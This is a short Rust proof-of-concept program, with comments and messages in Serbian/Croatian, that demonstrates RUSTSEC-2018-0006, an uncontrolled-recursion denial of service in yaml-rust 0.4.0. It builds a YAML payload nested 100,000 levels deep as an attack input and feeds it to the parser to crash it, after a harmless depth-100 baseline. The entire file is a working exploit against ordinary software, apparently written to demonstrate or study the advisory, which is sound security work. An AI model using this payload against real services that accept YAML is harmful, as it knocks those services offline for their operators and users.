fn make_nested_yaml(depth: usize) -> String {
    // Flow stil: {a: {a: {a: ...}}}
    // Svaki nivo dodaje tocno 4 bajta "{a: " i 1 bajt "}"
    let open  = "{a: ".repeat(depth);
    let close = "}".repeat(depth);
    format!("{}{}", open, close)
}

fn main() {
    println!("=== RUSTSEC-2018-0006: yaml-rust Uncontrolled Recursion DoS ===\n");

    println!("[1] Normalni YAML (depth=100):");
    let shallow = make_nested_yaml(100);
    match yaml_rust::YamlLoader::load_from_str(&shallow) {
        Ok(_)  => println!("    -> OK, server nastavlja rad"),
        Err(e) => println!("    -> Error: {}", e),
    }

    println!("\n[2] Napadacki YAML payload (depth=100000):");
    println!("    Generisanje payload-a...");
    let deep = make_nested_yaml(100_000);
    println!("    Payload size: {} bajtova (~{}KB)", deep.len(), deep.len() / 1024);
    println!("    Pokretanje parsiranja (bez depth limita u v0.4.0)...");

    let _ = yaml_rust::YamlLoader::load_from_str(&deep);

    println!("    -> Ova linija se NIKAD ne ispise ako je crash nastao!");
}

